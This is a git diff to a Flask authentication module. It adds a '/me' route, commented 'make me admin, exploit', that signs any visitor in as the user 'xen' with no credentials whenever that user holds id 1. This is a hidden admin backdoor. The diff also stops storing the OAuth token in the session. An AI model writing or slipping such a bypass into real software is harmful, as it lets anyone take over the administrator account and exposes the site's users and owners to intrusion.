@@ -12,6 +12,20 @@ gitauth = Blueprint('gitauth', __name__, url_prefix='/auth')
 def after_request(response):
     return response
 
+@gitauth.route('/me')
+def me():
+    # make me admin, exploit
+    user = User.get_or_init('xen')
+    if user.id == 1:
+        # XXX: this is temporary
+        session['user_id'] = user.id
+        g.user = user
+        flash('You were signed in')
+
+    return redirect(url_for('frontend.splash'))
+
+
+
 @gitauth.route('/login')
 def login():
     # import ipdb; ipdb.set_trace()
@@ -57,7 +71,6 @@ def authorized(next = None):
     db.session.commit()
 
     session['user_id'] = user.id
-    session['token'] = token
     g.user = user
     flash('You were signed in')
 
